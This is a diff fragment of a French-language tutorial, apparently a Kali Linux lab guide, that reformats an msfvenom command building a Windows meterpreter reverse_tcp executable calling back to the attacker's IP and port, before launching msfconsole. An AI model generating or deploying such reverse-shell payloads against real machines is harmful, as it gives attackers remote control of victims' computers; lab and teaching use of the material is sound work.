@@ -5,8 +5,7 @@
 Tout d'abord il faut commencer par donner le chemin du fichier :
 ```shell
 ┌──(kali㉿DESKTOPEnzo)-[~/Desktop]
-└─$ sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP.Kali> LPORT=<Port_voulu> 
--f exe -o <Chemin/nom.exe>
+└─$ sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP.Kali> LPORT=<Port_voulu> -f exe -o <Chemin/nom.exe>
 ```
 Une fois cela fait il faut lancer msf console 
 ```Shell
